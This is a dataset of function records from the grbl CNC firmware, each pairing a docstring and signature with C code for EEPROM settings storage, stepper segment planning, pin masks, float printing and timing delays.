{"docstring": "// Method to store Grbl global settings struct and version number into EEPROM\n", "func_signal": "void write_global_settings()", "code": "{\n  eeprom_put_char(0, SETTINGS_VERSION);\n  memcpy_to_eeprom_with_checksum(EEPROM_ADDR_GLOBAL, (char*)&settings, sizeof(settings_t));\n}", "path": "grbl/grbl/settings.c", "commit_date": "2015-06-25 00:00:00", "repo_name": "grbl/grbl", "stars": 5327, "license": "other", "language": "c", "size": 2285}
{"docstring": "// Reads startup line from EEPROM. Updated pointed line string data.\n", "func_signal": "uint8_t settings_read_startup_line(uint8_t n, char *line)", "code": "{\n  uint32_t addr = n*(LINE_BUFFER_SIZE+1)+EEPROM_ADDR_STARTUP_BLOCK;\n  if (!(memcpy_from_eeprom_with_checksum((char*)line, addr, LINE_BUFFER_SIZE))) {\n    // Reset line with default value\n    line[0] = 0; // Empty line\n    settings_store_startup_line(n, line);\n    return(false);\n  }\n  return(true);\n}", "path": "grbl/grbl/settings.c", "commit_date": "2015-06-25 00:00:00", "repo_name": "grbl/grbl", "stars": 5327, "license": "other", "language": "c", "size": 2285}
{"docstring": "// Returns direction pin mask according to Grbl internal axis indexing.\n", "func_signal": "uint8_t get_direction_pin_mask(uint8_t axis_idx)", "code": "{\n  if ( axis_idx == X_AXIS ) { return((1<<X_DIRECTION_BIT)); }\n  if ( axis_idx == Y_AXIS ) { return((1<<Y_DIRECTION_BIT)); }\n  return((1<<Z_DIRECTION_BIT));\n}", "path": "grbl/grbl/settings.c", "commit_date": "2015-06-25 00:00:00", "repo_name": "grbl/grbl", "stars": 5327, "license": "other", "language": "c", "size": 2285}
{"docstring": "// Returns limit pin mask according to Grbl internal axis indexing.\n", "func_signal": "uint8_t get_limit_pin_mask(uint8_t axis_idx)", "code": "{\n  if ( axis_idx == X_AXIS ) { return((1<<X_LIMIT_BIT)); }\n  if ( axis_idx == Y_AXIS ) { return((1<<Y_LIMIT_BIT)); }\n  return((1<<Z_LIMIT_BIT));\n}", "path": "grbl/grbl/settings.c", "commit_date": "2015-06-25 00:00:00", "repo_name": "grbl/grbl", "stars": 5327, "license": "other", "language": "c", "size": 2285}
{"docstring": "/* Prepares step segment buffer. Continuously called from main program. \n\n   The segment buffer is an intermediary buffer interface between the execution of steps\n   by the stepper algorithm and the velocity profiles generated by the planner. The stepper\n   algorithm only executes steps within the segment buffer and is filled by the main program\n   when steps are \"checked-out\" from the first block in the planner buffer. This keeps the\n   step execution and planning optimization processes atomic and protected from each other.\n   The number of steps \"checked-out\" from the planner buffer and the number of segments in\n   the segment buffer is sized and computed such that no operation in the main program takes\n   longer than the time it takes the stepper algorithm to empty it before refilling it. \n   Currently, the segment buffer conservatively holds roughly up to 40-50 msec of steps.\n   NOTE: Computation units are in steps, millimeters, and minutes.\n*/\n", "func_signal": "void st_prep_buffer()", "code": "{\n\n  if (sys.state & (STATE_HOLD|STATE_MOTION_CANCEL|STATE_SAFETY_DOOR)) { \n    // Check if we still need to generate more segments for a motion suspend.\n    if (prep.current_speed == 0.0) { return; } // Nothing to do. Bail.\n  }\n  \n  while (segment_buffer_tail != segment_next_head) { // Check if we need to fill the buffer.\n\n    // Determine if we need to load a new planner block or if the block has been replanned. \n    if (pl_block == NULL) {\n      pl_block = plan_get_current_block(); // Query planner for a queued block\n      if (pl_block == NULL) { return; } // No planner blocks. Exit.\n                      \n      // Check if the segment buffer completed the last planner block. If so, load the Bresenham\n      // data for the block. If not, we are still mid-block and the velocity profile was updated. \n      if (prep.flag_partial_block) {\n        prep.flag_partial_block = false; // Reset flag\n      } else {\n        // Increment stepper common data index to store new planner block data. \n        if ( ++prep.st_block_index == (SEGMENT_BUFFER_SIZE-1) ) { prep.st_block_index = 0; }\n        \n        // Prepare and copy Bresenham algorithm segment data from the new planner block, so that\n        // when the segment buffer completes the planner block, it may be discarded when the \n        // segment buffer finishes the prepped block, but the stepper ISR is still executing it. \n        st_prep_block = &st_block_buffer[prep.st_block_index];\n        st_prep_block->direction_bits = pl_block->direction_bits;\n        #ifndef ADAPTIVE_MULTI_AXIS_STEP_SMOOTHING\n          st_prep_block->steps[X_AXIS] = pl_block->steps[X_AXIS];\n          st_prep_block->steps[Y_AXIS] = pl_block->steps[Y_AXIS];\n          st_prep_block->steps[Z_AXIS] = pl_block->steps[Z_AXIS];\n          st_prep_block->step_event_count = pl_block->step_event_count;\n        #else\n          // With AMASS enabled, simply bit-shift multiply all Bresenham data by the max AMASS \n          // level, such that we never divide beyond the original data anywhere in the algorithm.\n          // If the original data is divided, we can lose a step from integer roundoff.\n          st_prep_block->steps[X_AXIS] = pl_block->steps[X_AXIS] << MAX_AMASS_LEVEL;\n          st_prep_block->steps[Y_AXIS] = pl_block->steps[Y_AXIS] << MAX_AMASS_LEVEL;\n          st_prep_block->steps[Z_AXIS] = pl_block->steps[Z_AXIS] << MAX_AMASS_LEVEL;\n          st_prep_block->step_event_count = pl_block->step_event_count << MAX_AMASS_LEVEL;\n        #endif\n        \n        // Initialize segment buffer data for generating the segments.\n        prep.steps_remaining = pl_block->step_event_count;\n        prep.step_per_mm = prep.steps_remaining/pl_block->millimeters;\n        prep.req_mm_increment = REQ_MM_INCREMENT_SCALAR/prep.step_per_mm;\n        \n        prep.dt_remainder = 0.0; // Reset for new planner block\n\n        if (sys.state & (STATE_HOLD|STATE_MOTION_CANCEL|STATE_SAFETY_DOOR)) {\n          // Override planner block entry speed and enforce deceleration during feed hold.\n          prep.current_speed = prep.exit_speed; \n          pl_block->entry_speed_sqr = prep.exit_speed*prep.exit_speed; \n        }\n        else { prep.current_speed = sqrt(pl_block->entry_speed_sqr); }\n      }\n     \n      /* --------------------------------------------------------------------------------- \n         Compute the velocity profile of a new planner block based on its entry and exit\n         speeds, or recompute the profile of a partially-completed planner block if the \n         planner has updated it. For a commanded forced-deceleration, such as from a feed \n         hold, override the planner velocities and decelerate to the target exit speed.\n      */\n      prep.mm_complete = 0.0; // Default velocity profile complete at 0.0mm from end of block.\n      float inv_2_accel = 0.5/pl_block->acceleration;\n      if (sys.state & (STATE_HOLD|STATE_MOTION_CANCEL|STATE_SAFETY_DOOR)) { // [Forced Deceleration to Zero Velocity]\n        // Compute velocity profile parameters for a feed hold in-progress. This profile overrides\n        // the planner block profile, enforcing a deceleration to zero speed.\n        prep.ramp_type = RAMP_DECEL;\n        // Compute decelerate distance relative to end of block.\n        float decel_dist = pl_block->millimeters - inv_2_accel*pl_block->entry_speed_sqr;\n        if (decel_dist < 0.0) {\n          // Deceleration through entire planner block. End of feed hold is not in this block.\n          prep.exit_speed = sqrt(pl_block->entry_speed_sqr-2*pl_block->acceleration*pl_block->millimeters);\n        } else {\n          prep.mm_complete = decel_dist; // End of feed hold.\n          prep.exit_speed = 0.0;\n        }\n      } else { // [Normal Operation]\n        // Compute or recompute velocity profile parameters of the prepped planner block.\n        prep.ramp_type = RAMP_ACCEL; // Initialize as acceleration ramp.\n        prep.accelerate_until = pl_block->millimeters; \n        prep.exit_speed = plan_get_exec_block_exit_speed();   \n        float exit_speed_sqr = prep.exit_speed*prep.exit_speed;\n        float intersect_distance =\n                0.5*(pl_block->millimeters+inv_2_accel*(pl_block->entry_speed_sqr-exit_speed_sqr));\n        if (intersect_distance > 0.0) {\n          if (intersect_distance < pl_block->millimeters) { // Either trapezoid or triangle types\n            // NOTE: For acceleration-cruise and cruise-only types, following calculation will be 0.0.\n            prep.decelerate_after = inv_2_accel*(pl_block->nominal_speed_sqr-exit_speed_sqr);\n            if (prep.decelerate_after < intersect_distance) { // Trapezoid type\n              prep.maximum_speed = sqrt(pl_block->nominal_speed_sqr);\n              if (pl_block->entry_speed_sqr == pl_block->nominal_speed_sqr) { \n                // Cruise-deceleration or cruise-only type.\n                prep.ramp_type = RAMP_CRUISE;\n              } else {\n                // Full-trapezoid or acceleration-cruise types\n                prep.accelerate_until -= inv_2_accel*(pl_block->nominal_speed_sqr-pl_block->entry_speed_sqr); \n              }\n            } else { // Triangle type\n              prep.accelerate_until = intersect_distance;\n              prep.decelerate_after = intersect_distance;\n              prep.maximum_speed = sqrt(2.0*pl_block->acceleration*intersect_distance+exit_speed_sqr);\n            }          \n          } else { // Deceleration-only type\n            prep.ramp_type = RAMP_DECEL;\n            // prep.decelerate_after = pl_block->millimeters;\n            prep.maximum_speed = prep.current_speed;\n          }\n        } else { // Acceleration-only type\n          prep.accelerate_until = 0.0;\n          // prep.decelerate_after = 0.0;\n          prep.maximum_speed = prep.exit_speed;\n        }\n      }  \n    }\n\n    // Initialize new segment\n    segment_t *prep_segment = &segment_buffer[segment_buffer_head];\n\n    // Set new segment to point to the current segment data block.\n    prep_segment->st_block_index = prep.st_block_index;\n\n    /*------------------------------------------------------------------------------------\n        Compute the average velocity of this new segment by determining the total distance\n      traveled over the segment time DT_SEGMENT. The following code first attempts to create \n      a full segment based on the current ramp conditions. If the segment time is incomplete \n      when terminating at a ramp state change, the code will continue to loop through the\n      progressing ramp states to fill the remaining segment execution time. However, if \n      an incomplete segment terminates at the end of the velocity profile, the segment is \n      considered completed despite having a truncated execution time less than DT_SEGMENT.\n        The velocity profile is always assumed to progress through the ramp sequence:\n      acceleration ramp, cruising state, and deceleration ramp. Each ramp's travel distance\n      may range from zero to the length of the block. Velocity profiles can end either at \n      the end of planner block (typical) or mid-block at the end of a forced deceleration, \n      such as from a feed hold.\n    */\n    float dt_max = DT_SEGMENT; // Maximum segment time\n    float dt = 0.0; // Initialize segment time\n    float time_var = dt_max; // Time worker variable\n    float mm_var; // mm-Distance worker variable\n    float speed_var; // Speed worker variable   \n    float mm_remaining = pl_block->millimeters; // New segment distance from end of block.\n    float minimum_mm = mm_remaining-prep.req_mm_increment; // Guarantee at least one step.\n    if (minimum_mm < 0.0) { minimum_mm = 0.0; }\n\n    do {\n      switch (prep.ramp_type) {\n        case RAMP_ACCEL: \n          // NOTE: Acceleration ramp only computes during first do-while loop.\n          speed_var = pl_block->acceleration*time_var;\n          mm_remaining -= time_var*(prep.current_speed + 0.5*speed_var);\n          if (mm_remaining < prep.accelerate_until) { // End of acceleration ramp.\n            // Acceleration-cruise, acceleration-deceleration ramp junction, or end of block.\n            mm_remaining = prep.accelerate_until; // NOTE: 0.0 at EOB\n            time_var = 2.0*(pl_block->millimeters-mm_remaining)/(prep.current_speed+prep.maximum_speed);\n            if (mm_remaining == prep.decelerate_after) { prep.ramp_type = RAMP_DECEL; }\n            else { prep.ramp_type = RAMP_CRUISE; }\n            prep.current_speed = prep.maximum_speed;\n          } else { // Acceleration only. \n            prep.current_speed += speed_var;\n          }\n          break;\n        case RAMP_CRUISE: \n          // NOTE: mm_var used to retain the last mm_remaining for incomplete segment time_var calculations.\n          // NOTE: If maximum_speed*time_var value is too low, round-off can cause mm_var to not change. To \n          //   prevent this, simply enforce a minimum speed threshold in the planner.\n          mm_var = mm_remaining - prep.maximum_speed*time_var;\n          if (mm_var < prep.decelerate_after) { // End of cruise. \n            // Cruise-deceleration junction or end of block.\n            time_var = (mm_remaining - prep.decelerate_after)/prep.maximum_speed;\n            mm_remaining = prep.decelerate_after; // NOTE: 0.0 at EOB\n            prep.ramp_type = RAMP_DECEL;\n          } else { // Cruising only.         \n            mm_remaining = mm_var; \n          } \n          break;\n        default: // case RAMP_DECEL:\n          // NOTE: mm_var used as a misc worker variable to prevent errors when near zero speed.\n          speed_var = pl_block->acceleration*time_var; // Used as delta speed (mm/min)\n          if (prep.current_speed > speed_var) { // Check if at or below zero speed.\n            // Compute distance from end of segment to end of block.\n            mm_var = mm_remaining - time_var*(prep.current_speed - 0.5*speed_var); // (mm)\n            if (mm_var > prep.mm_complete) { // Deceleration only.\n              mm_remaining = mm_var;\n              prep.current_speed -= speed_var;\n              break; // Segment complete. Exit switch-case statement. Continue do-while loop.\n            }\n          } // End of block or end of forced-deceleration.\n          time_var = 2.0*(mm_remaining-prep.mm_complete)/(prep.current_speed+prep.exit_speed);\n          mm_remaining = prep.mm_complete; \n      }\n      dt += time_var; // Add computed ramp time to total segment time.\n      if (dt < dt_max) { time_var = dt_max - dt; } // **Incomplete** At ramp junction.\n      else {\n        if (mm_remaining > minimum_mm) { // Check for very slow segments with zero steps.\n          // Increase segment time to ensure at least one step in segment. Override and loop\n          // through distance calculations until minimum_mm or mm_complete.\n          dt_max += DT_SEGMENT;\n          time_var = dt_max - dt;\n        } else { \n          break; // **Complete** Exit loop. Segment execution time maxed.\n        }\n      }\n    } while (mm_remaining > prep.mm_complete); // **Complete** Exit loop. Profile complete.\n\n   \n    /* -----------------------------------------------------------------------------------\n       Compute segment step rate, steps to execute, and apply necessary rate corrections.\n       NOTE: Steps are computed by direct scalar conversion of the millimeter distance \n       remaining in the block, rather than incrementally tallying the steps executed per\n       segment. This helps in removing floating point round-off issues of several additions. \n       However, since floats have only 7.2 significant digits, long moves with extremely \n       high step counts can exceed the precision of floats, which can lead to lost steps.\n       Fortunately, this scenario is highly unlikely and unrealistic in CNC machines\n       supported by Grbl (i.e. exceeding 10 meters axis travel at 200 step/mm).\n    */\n    float steps_remaining = prep.step_per_mm*mm_remaining; // Convert mm_remaining to steps\n    float n_steps_remaining = ceil(steps_remaining); // Round-up current steps remaining\n    float last_n_steps_remaining = ceil(prep.steps_remaining); // Round-up last steps remaining\n    prep_segment->n_step = last_n_steps_remaining-n_steps_remaining; // Compute number of steps to execute.\n    \n    // Bail if we are at the end of a feed hold and don't have a step to execute.\n    if (prep_segment->n_step == 0) {\n      if (sys.state & (STATE_HOLD|STATE_MOTION_CANCEL|STATE_SAFETY_DOOR)) {\n        // Less than one step to decelerate to zero speed, but already very close. AMASS \n        // requires full steps to execute. So, just bail.\n        prep.current_speed = 0.0; // NOTE: (=0.0) Used to indicate completed segment calcs for hold.\n        prep.dt_remainder = 0.0;\n        prep.steps_remaining = n_steps_remaining;\n        pl_block->millimeters = prep.steps_remaining/prep.step_per_mm; // Update with full steps.\n        plan_cycle_reinitialize();         \n        return; // Segment not generated, but current step data still retained.\n      }\n    }\n\n    // Compute segment step rate. Since steps are integers and mm distances traveled are not,\n    // the end of every segment can have a partial step of varying magnitudes that are not \n    // executed, because the stepper ISR requires whole steps due to the AMASS algorithm. To\n    // compensate, we track the time to execute the previous segment's partial step and simply\n    // apply it with the partial step distance to the current segment, so that it minutely\n    // adjusts the whole segment rate to keep step output exact. These rate adjustments are \n    // typically very small and do not adversely effect performance, but ensures that Grbl\n    // outputs the exact acceleration and velocity profiles as computed by the planner.\n    dt += prep.dt_remainder; // Apply previous segment partial step execute time\n    float inv_rate = dt/(last_n_steps_remaining - steps_remaining); // Compute adjusted step rate inverse\n    prep.dt_remainder = (n_steps_remaining - steps_remaining)*inv_rate; // Update segment partial step time\n\n    // Compute CPU cycles per step for the prepped segment.\n    uint32_t cycles = ceil( (TICKS_PER_MICROSECOND*1000000*60)*inv_rate ); // (cycles/step)    \n\n    #ifdef ADAPTIVE_MULTI_AXIS_STEP_SMOOTHING        \n      // Compute step timing and multi-axis smoothing level.\n      // NOTE: AMASS overdrives the timer with each level, so only one prescalar is required.\n      if (cycles < AMASS_LEVEL1) { prep_segment->amass_level = 0; }\n      else {\n        if (cycles < AMASS_LEVEL2) { prep_segment->amass_level = 1; }\n        else if (cycles < AMASS_LEVEL3) { prep_segment->amass_level = 2; }\n        else { prep_segment->amass_level = 3; }    \n        cycles >>= prep_segment->amass_level; \n        prep_segment->n_step <<= prep_segment->amass_level;\n      }\n      if (cycles < (1UL << 16)) { prep_segment->cycles_per_tick = cycles; } // < 65536 (4.1ms @ 16MHz)\n      else { prep_segment->cycles_per_tick = 0xffff; } // Just set the slowest speed possible.\n    #else \n      // Compute step timing and timer prescalar for normal step generation.\n      if (cycles < (1UL << 16)) { // < 65536  (4.1ms @ 16MHz)\n        prep_segment->prescaler = 1; // prescaler: 0\n        prep_segment->cycles_per_tick = cycles;\n      } else if (cycles < (1UL << 19)) { // < 524288 (32.8ms@16MHz)\n        prep_segment->prescaler = 2; // prescaler: 8\n        prep_segment->cycles_per_tick = cycles >> 3;\n      } else { \n        prep_segment->prescaler = 3; // prescaler: 64\n        if (cycles < (1UL << 22)) { // < 4194304 (262ms@16MHz)\n          prep_segment->cycles_per_tick =  cycles >> 6;\n        } else { // Just set the slowest speed possible. (Around 4 step/sec.)\n          prep_segment->cycles_per_tick = 0xffff;\n        }\n      }\n    #endif\n\n    // Segment complete! Increment segment buffer indices.\n    segment_buffer_head = segment_next_head;\n    if ( ++segment_next_head == SEGMENT_BUFFER_SIZE ) { segment_next_head = 0; }\n\n    // Setup initial conditions for next segment.\n    if (mm_remaining > prep.mm_complete) { \n      // Normal operation. Block incomplete. Distance remaining in block to be executed.\n      pl_block->millimeters = mm_remaining;      \n      prep.steps_remaining = steps_remaining;  \n    } else { \n      // End of planner block or forced-termination. No more distance to be executed.\n      if (mm_remaining > 0.0) { // At end of forced-termination.\n        // Reset prep parameters for resuming and then bail. Allow the stepper ISR to complete\n        // the segment queue, where realtime protocol will set new state upon receiving the \n        // cycle stop flag from the ISR. Prep_segment is blocked until then.\n        prep.current_speed = 0.0; // NOTE: (=0.0) Used to indicate completed segment calcs for hold.\n        prep.dt_remainder = 0.0;\n        prep.steps_remaining = ceil(steps_remaining);\n        pl_block->millimeters = prep.steps_remaining/prep.step_per_mm; // Update with full steps.\n        plan_cycle_reinitialize(); \n        return; // Bail!\n      } else { // End of planner block\n        // The planner block is complete. All steps are set to be executed in the segment buffer.\n        pl_block = NULL; // Set pointer to indicate check and load next planner block.\n        plan_discard_current_block();\n      }\n    }\n\n  } \n}", "path": "grbl/grbl/stepper.c", "commit_date": "2016-03-04 00:00:00", "repo_name": "grbl/grbl", "stars": 5327, "license": "other", "language": "c", "size": 2285}
{"docstring": "// Method to store coord data parameters into EEPROM\n", "func_signal": "void settings_write_coord_data(uint8_t coord_select, float *coord_data)", "code": "{  \n  uint32_t addr = coord_select*(sizeof(float)*N_AXIS+1) + EEPROM_ADDR_PARAMETERS;\n  memcpy_to_eeprom_with_checksum(addr,(char*)coord_data, sizeof(float)*N_AXIS);\n}", "path": "grbl/grbl/settings.c", "commit_date": "2015-06-25 00:00:00", "repo_name": "grbl/grbl", "stars": 5327, "license": "other", "language": "c", "size": 2285}
{"docstring": "// A helper method to set settings from command line\n", "func_signal": "uint8_t settings_store_global_setting(uint8_t parameter, float value)", "code": "{\n  if (value < 0.0) { return(STATUS_NEGATIVE_VALUE); } \n  if (parameter >= AXIS_SETTINGS_START_VAL) {\n    // Store axis configuration. Axis numbering sequence set by AXIS_SETTING defines.\n    // NOTE: Ensure the setting index corresponds to the report.c settings printout.\n    parameter -= AXIS_SETTINGS_START_VAL;\n    uint8_t set_idx = 0;\n    while (set_idx < AXIS_N_SETTINGS) {\n      if (parameter < N_AXIS) {\n        // Valid axis setting found.\n        switch (set_idx) {\n          case 0:\n            #ifdef MAX_STEP_RATE_HZ\n              if (value*settings.max_rate[parameter] > (MAX_STEP_RATE_HZ*60.0)) { return(STATUS_MAX_STEP_RATE_EXCEEDED); }\n            #endif\n            settings.steps_per_mm[parameter] = value;\n            break;\n          case 1:\n            #ifdef MAX_STEP_RATE_HZ\n              if (value*settings.steps_per_mm[parameter] > (MAX_STEP_RATE_HZ*60.0)) {  return(STATUS_MAX_STEP_RATE_EXCEEDED); }\n            #endif\n            settings.max_rate[parameter] = value;\n            break;\n          case 2: settings.acceleration[parameter] = value*60*60; break; // Convert to mm/min^2 for grbl internal use.\n          case 3: settings.max_travel[parameter] = -value; break;  // Store as negative for grbl internal use.\n        }\n        break; // Exit while-loop after setting has been configured and proceed to the EEPROM write call.\n      } else {\n        set_idx++;\n        // If axis index greater than N_AXIS or setting index greater than number of axis settings, error out.\n        if ((parameter < AXIS_SETTINGS_INCREMENT) || (set_idx == AXIS_N_SETTINGS)) { return(STATUS_INVALID_STATEMENT); }\n        parameter -= AXIS_SETTINGS_INCREMENT;\n      }\n    }\n  } else {\n    // Store non-axis Grbl settings\n    uint8_t int_value = trunc(value);\n    switch(parameter) {\n      case 0: \n        if (int_value < 3) { return(STATUS_SETTING_STEP_PULSE_MIN); }\n        settings.pulse_microseconds = int_value; break;\n      case 1: settings.stepper_idle_lock_time = int_value; break;\n      case 2: \n        settings.step_invert_mask = int_value; \n        st_generate_step_dir_invert_masks(); // Regenerate step and direction port invert masks.\n        break;\n      case 3: \n        settings.dir_invert_mask = int_value; \n        st_generate_step_dir_invert_masks(); // Regenerate step and direction port invert masks.\n        break;\n      case 4: // Reset to ensure change. Immediate re-init may cause problems.\n        if (int_value) { settings.flags |= BITFLAG_INVERT_ST_ENABLE; }\n        else { settings.flags &= ~BITFLAG_INVERT_ST_ENABLE; }\n        break;\n      case 5: // Reset to ensure change. Immediate re-init may cause problems.\n        if (int_value) { settings.flags |= BITFLAG_INVERT_LIMIT_PINS; }\n        else { settings.flags &= ~BITFLAG_INVERT_LIMIT_PINS; }\n        break;\n      case 6: // Reset to ensure change. Immediate re-init may cause problems.\n        if (int_value) { settings.flags |= BITFLAG_INVERT_PROBE_PIN; }\n        else { settings.flags &= ~BITFLAG_INVERT_PROBE_PIN; }\n        break;\n      case 10: settings.status_report_mask = int_value; break;\n      case 11: settings.junction_deviation = value; break;\n      case 12: settings.arc_tolerance = value; break;\n      case 13:\n        if (int_value) { settings.flags |= BITFLAG_REPORT_INCHES; }\n        else { settings.flags &= ~BITFLAG_REPORT_INCHES; }\n        break;\n      case 20:\n        if (int_value) { \n          if (bit_isfalse(settings.flags, BITFLAG_HOMING_ENABLE)) { return(STATUS_SOFT_LIMIT_ERROR); }\n          settings.flags |= BITFLAG_SOFT_LIMIT_ENABLE; \n        } else { settings.flags &= ~BITFLAG_SOFT_LIMIT_ENABLE; }\n        break;\n      case 21:\n        if (int_value) { settings.flags |= BITFLAG_HARD_LIMIT_ENABLE; }\n        else { settings.flags &= ~BITFLAG_HARD_LIMIT_ENABLE; }\n        limits_init(); // Re-init to immediately change. NOTE: Nice to have but could be problematic later.\n        break;\n      case 22:\n        if (int_value) { settings.flags |= BITFLAG_HOMING_ENABLE; }\n        else { \n          settings.flags &= ~BITFLAG_HOMING_ENABLE; \n          settings.flags &= ~BITFLAG_SOFT_LIMIT_ENABLE; // Force disable soft-limits.\n        }\n        break;\n      case 23: settings.homing_dir_mask = int_value; break;\n      case 24: settings.homing_feed_rate = value; break;\n      case 25: settings.homing_seek_rate = value; break;\n      case 26: settings.homing_debounce_delay = int_value; break;\n      case 27: settings.homing_pulloff = value; break;\n      default: \n        return(STATUS_INVALID_STATEMENT);\n    }\n  }\n  write_global_settings();\n  return(STATUS_OK);\n}", "path": "grbl/grbl/settings.c", "commit_date": "2015-06-25 00:00:00", "repo_name": "grbl/grbl", "stars": 5327, "license": "other", "language": "c", "size": 2285}
{"docstring": "// Convert float to string by immediately converting to a long integer, which contains\n// more digits than a float. Number of decimal places, which are tracked by a counter,\n// may be set by the user. The integer is then efficiently converted to a string.\n// NOTE: AVR '%' and '/' integer operations are very efficient. Bitshifting speed-up \n// techniques are actually just slightly slower. Found this out the hard way.\n", "func_signal": "void printFloat(float n, uint8_t decimal_places)", "code": "{\n  if (n < 0) {\n    serial_write('-');\n    n = -n;\n  }\n\n  uint8_t decimals = decimal_places;\n  while (decimals >= 2) { // Quickly convert values expected to be E0 to E-4.\n    n *= 100;\n    decimals -= 2;\n  }\n  if (decimals) { n *= 10; }\n  n += 0.5; // Add rounding factor. Ensures carryover through entire value.\n    \n  // Generate digits backwards and store in string.\n  unsigned char buf[10]; \n  uint8_t i = 0;\n  uint32_t a = (long)n;  \n  buf[decimal_places] = '.'; // Place decimal point, even if decimal places are zero.\n  while(a > 0) {\n    if (i == decimal_places) { i++; } // Skip decimal point location\n    buf[i++] = (a % 10) + '0'; // Get digit\n    a /= 10;\n  }\n  while (i < decimal_places) { \n     buf[i++] = '0'; // Fill in zeros to decimal point for (n < 1)\n  }\n  if (i == decimal_places) { // Fill in leading zero, if needed.\n    i++;\n    buf[i++] = '0'; \n  }   \n  \n  // Print the generated string.\n  for (; i > 0; i--)\n    serial_write(buf[i-1]);\n}", "path": "grbl/grbl/print.c", "commit_date": "2015-05-23 00:00:00", "repo_name": "grbl/grbl", "stars": 5327, "license": "other", "language": "c", "size": 2285}
{"docstring": "// Read selected coordinate data from EEPROM. Updates pointed coord_data value.\n", "func_signal": "uint8_t settings_read_coord_data(uint8_t coord_select, float *coord_data)", "code": "{\n  uint32_t addr = coord_select*(sizeof(float)*N_AXIS+1) + EEPROM_ADDR_PARAMETERS;\n  if (!(memcpy_from_eeprom_with_checksum((char*)coord_data, addr, sizeof(float)*N_AXIS))) {\n    // Reset with default zero vector\n    clear_vector_float(coord_data); \n    settings_write_coord_data(coord_select,coord_data);\n    return(false);\n  }\n  return(true);\n}", "path": "grbl/grbl/settings.c", "commit_date": "2015-06-25 00:00:00", "repo_name": "grbl/grbl", "stars": 5327, "license": "other", "language": "c", "size": 2285}
{"docstring": "// Delays variable defined microseconds. Compiler compatibility fix for _delay_us(),\n// which only accepts constants in future compiler releases. Written to perform more \n// efficiently with larger delays, as the counter adds parasitic time in each iteration.\n", "func_signal": "void delay_us(uint32_t us)", "code": "{\n  while (us) {\n    if (us < 10) { \n      _delay_us(1);\n      us--;\n    } else if (us < 100) {\n      _delay_us(10);\n      us -= 10;\n    } else if (us < 1000) {\n      _delay_us(100);\n      us -= 100;\n    } else {\n      _delay_ms(1);\n      us -= 1000;\n    }\n  }\n}", "path": "grbl/grbl/nuts_bolts.c", "commit_date": "2015-02-16 00:00:00", "repo_name": "grbl/grbl", "stars": 5327, "license": "other", "language": "c", "size": 2285}
{"docstring": "// Method to restore EEPROM-saved Grbl global settings back to defaults. \n", "func_signal": "void settings_restore(uint8_t restore_flag)", "code": "{  \n  if (restore_flag & SETTINGS_RESTORE_DEFAULTS) {\n\tsettings.pulse_microseconds = DEFAULT_STEP_PULSE_MICROSECONDS;\n\tsettings.stepper_idle_lock_time = DEFAULT_STEPPER_IDLE_LOCK_TIME;\n\tsettings.step_invert_mask = DEFAULT_STEPPING_INVERT_MASK;\n\tsettings.dir_invert_mask = DEFAULT_DIRECTION_INVERT_MASK;\n\tsettings.status_report_mask = DEFAULT_STATUS_REPORT_MASK;\n\tsettings.junction_deviation = DEFAULT_JUNCTION_DEVIATION;\n\tsettings.arc_tolerance = DEFAULT_ARC_TOLERANCE;\n\tsettings.homing_dir_mask = DEFAULT_HOMING_DIR_MASK;\n\tsettings.homing_feed_rate = DEFAULT_HOMING_FEED_RATE;\n\tsettings.homing_seek_rate = DEFAULT_HOMING_SEEK_RATE;\n\tsettings.homing_debounce_delay = DEFAULT_HOMING_DEBOUNCE_DELAY;\n\tsettings.homing_pulloff = DEFAULT_HOMING_PULLOFF;\n\n\tsettings.flags = 0;\n\tif (DEFAULT_REPORT_INCHES) { settings.flags |= BITFLAG_REPORT_INCHES; }\n\tif (DEFAULT_INVERT_ST_ENABLE) { settings.flags |= BITFLAG_INVERT_ST_ENABLE; }\n\tif (DEFAULT_INVERT_LIMIT_PINS) { settings.flags |= BITFLAG_INVERT_LIMIT_PINS; }\n\tif (DEFAULT_SOFT_LIMIT_ENABLE) { settings.flags |= BITFLAG_SOFT_LIMIT_ENABLE; }\n\tif (DEFAULT_HARD_LIMIT_ENABLE) { settings.flags |= BITFLAG_HARD_LIMIT_ENABLE; }\n\tif (DEFAULT_HOMING_ENABLE) { settings.flags |= BITFLAG_HOMING_ENABLE; }\n  \n\tsettings.steps_per_mm[X_AXIS] = DEFAULT_X_STEPS_PER_MM;\n\tsettings.steps_per_mm[Y_AXIS] = DEFAULT_Y_STEPS_PER_MM;\n\tsettings.steps_per_mm[Z_AXIS] = DEFAULT_Z_STEPS_PER_MM;\n\tsettings.max_rate[X_AXIS] = DEFAULT_X_MAX_RATE;\n\tsettings.max_rate[Y_AXIS] = DEFAULT_Y_MAX_RATE;\n\tsettings.max_rate[Z_AXIS] = DEFAULT_Z_MAX_RATE;\n\tsettings.acceleration[X_AXIS] = DEFAULT_X_ACCELERATION;\n\tsettings.acceleration[Y_AXIS] = DEFAULT_Y_ACCELERATION;\n\tsettings.acceleration[Z_AXIS] = DEFAULT_Z_ACCELERATION;\n\tsettings.max_travel[X_AXIS] = (-DEFAULT_X_MAX_TRAVEL);\n\tsettings.max_travel[Y_AXIS] = (-DEFAULT_Y_MAX_TRAVEL);\n\tsettings.max_travel[Z_AXIS] = (-DEFAULT_Z_MAX_TRAVEL);    \n\n\twrite_global_settings();\n  }\n  \n  if (restore_flag & SETTINGS_RESTORE_PARAMETERS) {\n\tuint8_t idx;\n\tfloat coord_data[N_AXIS];\n\tmemset(&coord_data, 0, sizeof(coord_data));\n\tfor (idx=0; idx <= SETTING_INDEX_NCOORD; idx++) { settings_write_coord_data(idx, coord_data); }\n  }\n  \n  if (restore_flag & SETTINGS_RESTORE_STARTUP_LINES) {\n\t#if N_STARTUP_LINE > 0\n\teeprom_put_char(EEPROM_ADDR_STARTUP_BLOCK, 0);\n\t#endif\n\t#if N_STARTUP_LINE > 1\n\teeprom_put_char(EEPROM_ADDR_STARTUP_BLOCK+(LINE_BUFFER_SIZE+1), 0);\n\t#endif\n  }\n  \n  if (restore_flag & SETTINGS_RESTORE_BUILD_INFO) { eeprom_put_char(EEPROM_ADDR_BUILD_INFO , 0); }\n}", "path": "grbl/grbl/settings.c", "commit_date": "2015-06-25 00:00:00", "repo_name": "grbl/grbl", "stars": 5327, "license": "other", "language": "c", "size": 2285}
